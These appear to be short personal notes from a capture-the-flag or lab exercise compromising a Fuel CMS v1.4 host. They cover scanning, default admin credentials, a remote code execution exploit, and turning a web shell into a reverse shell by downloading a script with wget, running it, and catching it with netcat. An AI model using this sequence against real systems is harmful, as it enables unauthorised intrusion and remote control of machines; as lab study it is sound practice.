nmap
80: Fuel CMS v1.4

got to dashboard at: ip/fuel as admin:admin -> rabit hole

got Remote Code Execution -> reverse shell

first we have web shell using exploit

searching for bash reverse shell : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

create a bash file: rev.sh, paste the found bash rev shell in

make a local http server to store rev.sh

in webshell download rev.sh: wget http://ip/rev.sh

chmod +x

bash rev.sh

run netcat at local machine -> reverse shell

from a simple shell to fully shell: https://forum.hackthebox.eu/discussion/1713/su-must-be-run-from-a-terminal





